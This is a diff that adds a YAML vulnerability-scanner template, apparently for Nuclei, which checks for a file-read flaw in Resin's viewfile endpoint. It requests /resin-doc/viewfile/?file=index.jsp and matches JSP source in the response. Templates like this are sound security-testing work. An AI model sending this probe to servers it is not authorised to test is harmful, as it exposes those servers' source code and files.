@@ -1,0 +1,19 @@
+id: poc-yaml-resin-viewfile-fileread
+info:
+  name: Resin Viewfile File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/resin-doc/viewfile/?file=index.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "%@ page session=\"false\" import=\"com.caucho.vfs.*, com.caucho.server.webapp.*\" %"
